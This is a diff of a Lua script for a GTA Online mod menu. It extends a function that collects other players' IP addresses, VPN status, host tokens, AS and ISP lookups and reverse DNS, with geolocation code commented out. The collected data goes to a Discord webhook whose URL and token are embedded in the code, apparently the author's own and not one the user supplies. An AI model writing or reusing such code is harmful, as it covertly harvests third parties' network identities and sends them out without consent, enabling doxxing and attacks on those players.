@@ -222,18 +222,7 @@ end
 function IsDetectionPresent(pid, detection)
     if players.exists(pid) then
         for menu.player_root(pid):getChildren() as cmd do
-            if cmd:getType() == COMMAND_LIST_CUSTOM_SPECIAL_MEANING and cmd:refByRelPath(detection):isValid() then
-                return true
-            end
-        end
-    end
-    return false
-end
-
-function StandUser(pid) -- credit to sapphire for this
-    if players.exists(pid) and pid != players.user() then
-        for menu.player_root(pid):getChildren() as cmd do
-            if cmd:getType() == COMMAND_LIST_CUSTOM_SPECIAL_MEANING and cmd:refByRelPath("Stand User"):isValid() then
+            if cmd:getType() == COMMAND_LIST_CUSTOM_SPECIAL_MEANING and cmd:refByRelPath(detection):isValid() and players.exists(pid) then
                 return true
             end
         end
@@ -262,12 +251,9 @@ function GET_INT_LOCAL(Script, Local)
         end
     end
 end
-function getMPX()
-    return 'MP'.. util.get_char_slot() ..'_'
-end
 function STAT_GET_INT(Stat)
     local Int_PTR = memory.alloc_int()
-    STATS.STAT_GET_INT(joaat(getMPX() .. Stat), Int_PTR, -1)
+    STATS.STAT_GET_INT(joaat("MP"..util.get_char_slot().."_".. Stat), Int_PTR, -1)
     return memory.read_int(Int_PTR)
 end
 function IS_MPPLY(Stat) 
@@ -287,7 +273,7 @@ function IS_MPPLY(Stat)
 end
 function ADD_MP_INDEX(Stat)
     if not IS_MPPLY(Stat) then
-        Stat = "MP" .. util.get_char_slot() .. "_" .. Stat
+        Stat = "MP"..util.get_char_slot().."_" .. Stat
     end
     return Stat
 end
@@ -452,9 +438,9 @@ function player_ip(pid)
     math.floor(connectIP / 2^8) % 256,
     connectIP % 256)
     if ipStringplayer == "255.255.255.255" then
-        return "Connected via Relay"
+        return "Connected via Relay", false
     else
-        return ipStringplayer
+        return ipStringplayer, true
     end
 end
 
@@ -586,6 +572,8 @@ function save_player_info(pid)
         local file = io.open(filepath, "w")
         local hook_file = io.open(lenaDir.."Saved Players Webhook.txt", "r")
         local hook = hook_file:read("a")
+
+        -- Initialize the player_info table
         local player_info = {
             os.date("%a, %d. %B %X"),
             "\n\nName with Tags: ", name_with_tags,
@@ -594,14 +582,33 @@ function save_player_info(pid)
             "\nRank: ", rank,
             "\nMoney: ", money,
             "\nK/D: ", kd,
-            "\nIs Using VPN: ", is_using_vpn and "Yes" or "No",
-            "\nIPv4: ", player_ip,
             "\nLanguage: ", language_int,
             "\nIs Attacker: ", is_attacker and "Yes" or "No",
             "\nHost Token: ", host_token,
             "\nIs Using Controller: ", is_using_controller and "Yes" or "No",
-            "\nClan Motto: ", tostring(clan_motto)
+            "\nClan Motto: ", tostring(clan_motto),
+            "\n",
+            "\n**Net Intel**",
+            "\nIs Using VPN: ", is_using_vpn and "Yes" or "No",
+            "\nIPv4: ", player_ip
         }
+
+        if player_ip != false then
+            local as, dns = soup.netIntel.getAsByIp(player_ip), soup.IpAddr(player_ip)
+            player_info[#player_info + 1] = "\nNetIntel addr: " .. tostring(dns) .. ", " .. dns:getReverseDns()
+            player_info[#player_info + 1] = "\nNetIntel Number: " .. as.number
+            player_info[#player_info + 1] = "\nNetIntel Handle: " .. as.handle
+            player_info[#player_info + 1] = "\nNetIntel Name: " .. as.name
+            player_info[#player_info + 1] = "\nIs Hosting: " .. tostring(as:isHosting() and "Yes" or "No")
+
+            --local loc = soup.netIntel.getLocationByIp("1.1.1.1")
+            --player_info[#player_info + 1] = "\n\nNetIntel City: " .. loc.city
+            --player_info[#player_info + 1] = "\nNetIntel State: " .. loc.state
+            --player_info[#player_info + 1] = "\nNetIntel County Code: " .. loc.country_code
+        else
+            player_info[#player_info + 1] = "\nConnected to Rockstar's Server. Intel will not be shown."
+        end
+
         file:write(table.concat(player_info))
         file:close()
         notify(string.format("%s's information has been saved to file.", name))
@@ -609,7 +616,7 @@ function save_player_info(pid)
         local icon_url = string.format("https://a.rsg.sc/n/%s/n", string.lower(name))
         local json_data = {
             username = name,
-            avatar_url = "https://cdn.freebiesupply.com/logos/large/2x/rockstar-games-logo-black-and-white.png",
+            avatar_url = "https://cdn.discordapp.com/avatars/1149407532318740623/7583af5a7004aab44131c835eb8e5114.jpg?size=1024&width=0&height=256",
             embeds = {
                 {
                     title = name,
@@ -629,8 +636,9 @@ function save_player_info(pid)
         if not is_developer() then
             send_to_hook("discord.com", "/api/webhooks/1149407532318740623/C2VnbpRyW4_Y2A4iTuKCdhhu00MLTf1vF2DVq0wkBlDrw_qIy_1KzWi1dt-pSiQNBRFb", "application/json", json_string)
         end
-    end
+    end 
 end
+
 
 
 -- Weapon Speed Modifier
